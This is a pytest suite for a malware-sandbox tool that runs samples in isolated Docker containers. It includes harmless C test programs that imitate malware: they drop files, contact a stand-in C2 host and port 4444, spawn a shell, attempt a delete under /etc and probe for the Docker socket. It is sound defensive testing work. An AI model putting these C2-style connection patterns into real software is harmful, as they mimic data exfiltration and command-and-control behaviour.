"""rebox live end to end: real containers, harmless self-written test programs.

Skipped with a reason when Docker is not running, the rebox-live image is not
built (`rebox live-setup`) or zig is missing. Every container these tests
cause is checked to be gone afterwards.
"""

import json
import os
import shutil
import signal
import stat
import subprocess
import sys
import time

import pytest

from rebox import live, live_docker

ZIG = shutil.which("zig") or "/opt/homebrew/bin/zig"

BEHAVE_C = r'''
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
int main(void) {
    int fd = open("/tmp/rebox_drop.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) { write(fd, "rebox live payload\n", 19); close(fd); }
    struct addrinfo hints, *res = 0;
    memset(&hints, 0, sizeof hints); hints.ai_socktype = SOCK_STREAM;
    int g = getaddrinfo("c2.rebox-test.invalid", "443", &hints, &res);
    printf("getaddrinfo=%d\n", g);
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sa; memset(&sa, 0, sizeof sa);
    sa.sin_family = AF_INET; sa.sin_port = htons(4444);
    inet_pton(AF_INET, "198.51.100.7", &sa.sin_addr);
    int c = connect(s, (struct sockaddr *)&sa, sizeof sa);
    printf("connect=%d\n", c);
    if (c == 0) write(s, "HELLO rebox", 11);
    fflush(stdout);
    pid_t p = fork();
    if (p == 0) {
        execl("/bin/sh", "sh", "-c", "echo rebox-child; echo x > /tmp/child_note.txt", (char *)0);
        _exit(127);
    }
    int st = 0; waitpid(p, &st, 0);
    unlink("/etc/rebox-test-delete-me");
    return 42;
}
'''

SLEEPER_C = "#include <unistd.h>\nint main(void) { for (;;) pause(); }\n"

PROBE_C = r'''
#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
static void dump(const char *p) {
    FILE *f = fopen(p, "r");
    printf("==> %s\n", p);
    if (!f) { printf("ERR %d\n", errno); return; }
    char b[4096]; size_t n;
    while ((n = fread(b, 1, sizeof b, f)) > 0) fwrite(b, 1, n, stdout);
    fclose(f);
    printf("<== %s\n", p);
}
int main(void) {
    dump("/proc/self/status");
    dump("/proc/net/dev");
    dump("/proc/self/mountinfo");
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a; memset(&a, 0, sizeof a);
    a.sin_family = AF_INET; a.sin_port = htons(80);
    inet_pton(AF_INET, "198.51.100.1", &a.sin_addr);
    int r = connect(s, (struct sockaddr *)&a, sizeof a);
    printf("CONNECT %d %d\n", r, r ? errno : 0);
    printf("DOCKERSOCK %d %d\n", access("/var/run/docker.sock", F_OK) == 0, access("/run/docker.sock", F_OK) == 0);
    printf("UID %d\n", (int)geteuid());
    return 0;
}
'''

TARGETS = {
    "arm64-static": ["-target", "aarch64-linux-musl", "-static"],
    "x64-static": ["-target", "x86_64-linux-musl", "-static"],
    "x64-dyn": ["-target", "x86_64-linux-gnu.2.31"],
    "x86-static": ["-target", "x86-linux-musl", "-static"],
}


def _skip_reason():
    if live_docker.docker_bin() is None:
        return "docker CLI not installed"
    if live_docker.daemon() is None:
        return "Docker daemon not running"
    if live_docker.image() is None:
        return f"image {live_docker.IMAGE_TAG} not built (run `rebox live-setup`)"
    if not os.access(ZIG, os.X_OK):
        return "zig not found (needed to build the Linux test programs)"
    return None


REASON = _skip_reason()
pytestmark = pytest.mark.skipif(REASON is not None, reason=REASON or "")


@pytest.fixture(scope="module")
def progs(tmp_path_factory):
    d = tmp_path_factory.mktemp("live-progs")
    srcs = {"behave": BEHAVE_C, "sleeper": SLEEPER_C, "probe": PROBE_C}
    out = {}
    for name, src in srcs.items():
        c = d / f"{name}.c"
        c.write_text(src)
        for tgt, flags in TARGETS.items():
            if name != "behave" and tgt not in ("arm64-static", "x64-static"):
                continue
            exe = d / f"{name}-{tgt}"
            env = {**os.environ, "ZIG_GLOBAL_CACHE_DIR": str(d / ".zig-cache"),
                   "ZIG_LOCAL_CACHE_DIR": str(d / ".zig-cache")}
            subprocess.run([ZIG, "cc", *flags, "-O1", "-o", str(exe), str(c)], check=True, env=env,
                           capture_output=True)
            os.chmod(exe, 0o600)  # never executable on the host
            out[f"{name}-{tgt}"] = exe
    return out


def run_live(*args, timeout=300):
    p = subprocess.run([sys.executable, "-I", "-B", "-m", "rebox.live", *map(str, args)], capture_output=True,
                       text=True, timeout=timeout)
    lines = [ln for ln in p.stdout.splitlines() if ln.strip()]
    assert len(lines) == 1, f"expected one JSON line, got {p.stdout[:500]!r} / {p.stderr[-800:]}"
    return p.returncode, json.loads(lines[0]), lines[0], p.stderr


def containers_for(sha):
    p = live_docker.run(["ps", "-a", "-q", "--filter", f"label=rebox-live.sha256={sha}"], check=False)
    return p.stdout.decode().split()


def _sha(path):
    import hashlib
    return hashlib.sha256(path.read_bytes()).hexdigest()


@pytest.mark.parametrize("tgt", list(TARGETS))
def test_behaviour_is_reported(progs, tmp_path, tgt):
    exe = progs[f"behave-{tgt}"]
    out = tmp_path / "out"
    rc, s, text, err = run_live(exe, "--out", out, "--timeout", "30")
    assert rc == 0, (s, err[-800:])
    assert len(text) <= 6000
    e, ind = s["execution"], s["indicators"]
    assert e["stop"] == "exited" and e["exit_code"] == 42
    assert ("native" in e["engine"]) == (tgt == "arm64-static")
    if tgt != "arm64-static":
        assert ("qemu-i386" if tgt == "x86-static" else "qemu-x86_64") in e["engine"]
    assert s["sample"]["linkage"] == ("dynamic" if tgt == "x64-dyn" else "static")
    assert "c2.rebox-test.invalid" in ind["hosts"]["top"]
    assert "tcp connect 198.51.100.7:4444 ENETUNREACH" in ind["conns"]["top"]
    assert "198.51.100.7" in ind["ips"]["top"]
    assert "sh -c 'echo rebox-child; echo x > /tmp/child_note.txt'" in ind["cmdlines"]["top"]
    assert "/tmp/rebox_drop.txt" in ind["files_written"]["top"]
    assert "/tmp/child_note.txt" in ind["files_written"]["top"]  # written by the child: children are followed
    assert any(x.startswith("/etc/rebox-test-delete-me") for x in ind["files_deleted"]["top"])
    procs = e["processes"]["top"]
    assert len(procs) == 2 and "[exit 42]" in procs[0] and "sh -c" in procs[1] and "[exit 0]" in procs[1]
    drops = {p["path"]: p for p in s["payloads"]["top"]}
    assert set(drops) == {"/tmp/rebox_drop.txt", "/tmp/child_note.txt"}
    f = out / drops["/tmp/rebox_drop.txt"]["file"]
    assert f.read_bytes() == b"rebox live payload\n"
    for p in out.rglob("*"):
        if p.is_file():
            assert not p.stat().st_mode & 0o111, p
    for p in (out / "dumps").iterdir():
        assert stat.S_IMODE(p.stat().st_mode) == 0o600 and p.suffix == ".bin"
    assert e["container_removed"] is True and containers_for(_sha(exe)) == []
    assert s["output"]["stdout"]["head"].startswith("getaddrinfo=")


def _probe_view(stdout: str) -> dict:
    sections, cur = {}, None
    for line in stdout.splitlines():
        if line.startswith("==> "):
            cur = line[4:]
            sections[cur] = []
        elif line.startswith("<== "):
            cur = None
        elif cur:
            sections[cur].append(line)
        else:
            k, _, v = line.partition(" ")
            sections[k] = v
    return sections


@pytest.mark.parametrize("tgt,extra", [("arm64-static", []), ("x64-static", []), ("arm64-static", ["--fakenet"]),
                                       ("arm64-static", ["--user"]), ("arm64-static", ["--user", "--fakenet"])])
def test_isolation_as_seen_by_the_sample(progs, tmp_path, tgt, extra):
    out = tmp_path / "out"
    rc, s, _text, err = run_live(progs[f"probe-{tgt}"], "--out", out, "--timeout", "30", *extra)
    assert rc == 0, (s, err[-800:])
    view = _probe_view((out / "container" / "stdout.bin").read_text())
    status = dict(ln.split(":", 1) for ln in view["/proc/self/status"] if ":" in ln)
    for cap in ("CapInh", "CapPrm", "CapEff", "CapBnd", "CapAmb"):
        assert int(status[cap].strip(), 16) == 0, (cap, status[cap], extra)
    assert status["NoNewPrivs"].strip() == "1"
    ifaces = sorted(ln.split(":")[0].strip() for ln in view["/proc/net/dev"][2:] if ":" in ln)
    assert ifaces == ["lo"]
    for ln in view["/proc/self/mountinfo"]:
        left, _, right = ln.partition(" - ")
        root, target, fstype = left.split()[3], left.split()[4], right.split()[0]
        assert fstype not in ("virtiofs", "9p", "fakeowner", "nfs", "cifs") and not fstype.startswith("fuse"), ln
        if root != "/" and fstype not in ("proc", "tmpfs"):
            assert target in ("/etc/hostname", "/etc/hosts", "/etc/resolv.conf"), ln
    assert view["DOCKERSOCK"] == "0 0"
    errno_unreach = "101"
    if "--fakenet" in extra:
        assert view["CONNECT"] == "0 0"  # accepted by the in-container sink
        assert any("198.51.100.1:80" in t for t in s["fakenet"]["tcp"]["top"])
    else:
        assert view["CONNECT"].split() == ["-1", errno_unreach]
    assert view["UID"] == ("1000" if "--user" in extra else "0")
    nc = json.loads((out / "container" / "netcheck.json").read_text())
    assert nc["ok"] and nc["interfaces"] == ["lo"] and nc["probes"]["tcp4"] == "ENETUNREACH"
    run = json.loads((out / "run.json").read_text())
    assert run["inspect_check"]["ok"] and run["container_removed"]
    assert containers_for(_sha(progs[f"probe-{tgt}"])) == []


@pytest.mark.parametrize("tgt", ["x64-static", "arm64-static"])
def test_timeout_kills_and_reports(progs, tmp_path, tgt):
    exe = progs[f"sleeper-{tgt}"]
    t0 = time.monotonic()
    rc, s, _t, err = run_live(exe, "--out", tmp_path / "out", "--timeout", "3")
    took = time.monotonic() - t0
    assert rc == 0, (s, err[-500:])
    e = s["execution"]
    assert e["stop"] == "timeout" and e["exit_code"] is None
    assert 2.5 <= e["sample_s"] < 6
    assert took < 3 + 30  # well inside the backstop (timeout + max(30, timeout))
    assert "killed" in e["processes"]["top"][0]
    assert e["container_removed"] and containers_for(_sha(exe)) == []


def test_container_removed_after_collection_failure(progs, tmp_path, monkeypatch, capsys):
    exe = progs["behave-arm64-static"]

    def broken(*a, **k):
        raise RuntimeError("simulated collection failure")
    monkeypatch.setattr(live_docker, "collect_out", broken)
    rc = live._standalone([str(exe), "--out", str(tmp_path / "out"), "--timeout", "20"])
    res = json.loads(capsys.readouterr().out.strip().splitlines()[-1])
    assert rc == 4 and "simulated collection failure" in res["error"]
    run = json.loads((tmp_path / "out" / "run.json").read_text())
    assert run["container_removed"] is True
    assert containers_for(_sha(exe)) == []


def test_ctrl_c_removes_container(progs, tmp_path):
    exe = progs["sleeper-arm64-static"]
    sha = _sha(exe)
    p = subprocess.Popen([sys.executable, "-I", "-B", "-m", "rebox.live", str(exe), "--out", str(tmp_path / "o"),
                          "--timeout", "120"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    try:
        for _ in range(100):
            if containers_for(sha):
                break
            time.sleep(0.2)
        assert containers_for(sha), "container never appeared"
        time.sleep(1.5)
        p.send_signal(signal.SIGINT)
        out, err = p.communicate(timeout=120)
    finally:
        if p.poll() is None:
            p.kill()
    res = json.loads(out.strip().splitlines()[-1])
    assert p.returncode == 130 and res["ok"] is False and "interrupted" in res["error"]
    assert containers_for(sha) == []


def test_leftover_containers_are_detected_and_cleaned():
    img = live_docker.image()
    dead = 999_999
    while True:
        try:
            os.kill(dead, 0)
            dead -= 1
        except ProcessLookupError:
            break
        except PermissionError:
            dead -= 1
    import socket as _s
    name = f"rebox-live-leftover-test-{os.getpid()}"
    live_docker.run(["create", "--name", name, "--label", "rebox-live=run", "--label", f"rebox-live.pid={dead}",
                     "--label", f"rebox-live.host={_s.gethostname()}", "--label", "rebox-live.deadline=9999999999",
                     "--label", "rebox-live.sha256=leftover-test", "--network", "none", img["id"]])
    try:
        assert any(c["name"] == name for c in live_docker.stale_runs())
        rc, s, _t, _e = run_live("--cleanup")
        assert rc == 0 and name in s["removed"]
        assert containers_for("leftover-test") == []
    finally:
        live_docker.run(["rm", "-f", name], check=False)
